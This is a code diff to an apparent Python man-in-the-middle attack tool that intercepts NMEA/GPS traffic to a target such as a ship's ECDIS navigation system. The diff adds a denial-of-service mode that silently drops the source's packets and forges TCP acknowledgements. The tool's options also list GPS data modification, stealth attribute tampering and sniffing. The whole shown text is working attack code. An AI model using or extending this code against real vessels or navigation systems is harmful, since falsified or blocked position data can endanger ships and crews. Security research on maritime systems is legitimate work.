@@ -38,7 +38,26 @@ class MITM:
             if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                 print("-"*20)
                 print(f"[*] Packet Intercepted with payload \n{payload}")
-            
+                # print(pktIP[TCP].seq)
+                # print(pktIP[TCP].ack)
+                # print(len(pktIP[TCP].payload))
+                # print(pktIP[IP].len)  
+            packet.accept()
+    
+    def dos(self, packet):
+        
+        pkt = packet.get_payload()
+        pktIP = IP(pkt)
+        
+        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
+        
+        if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
+            print("."*2)
+            print(f"[*] Packet Intercepted and Dropped with payload \n{payload}")
+            ack_pkt = IP(src=pktIP[IP].dst, dst=pktIP[IP].src)/TCP(sport=pktIP[TCP].dport, dport=pktIP[TCP].sport, seq=pktIP[TCP].ack, ack=pktIP[TCP].seq + len(pktIP[TCP].payload), flags='A')
+            send(ack_pkt)
+            packet.drop()
+        else:
             packet.accept()
 
     def modify(self, packet):
@@ -86,7 +105,7 @@ class MITM:
            print(e)
 
         packet.accept()
-       
+
     def stealth(self, packet):
         
         pkt = packet.get_payload()
@@ -145,6 +164,8 @@ class MITM:
             self.nfqueue.bind(0, self.stealth)
         elif self.option == "S":
             self.nfqueue.bind(0, self.sniff)
+        elif self.option == "D":
+            self.nfqueue.bind(0, self.dos) 
 
     def clean_up(self):
         print("[*] Flushing iptables")
@@ -160,7 +181,7 @@ def get_input():
     parser.add_argument("-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
     parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
     parser.add_argument("-c", "--config", help="JSON config file")
-    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack\nA - stealth GPS nmea attribute attack\nS - Sniffing attack", required=True)
+    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack, A - stealth GPS nmea attribute attack, S - Sniffing attack, D - DoS attack", required=True)
    # parser.add_argument("-a", "--attr", help="nmea GPS attribute comma separated names")
 
     args = parser.parse_args()
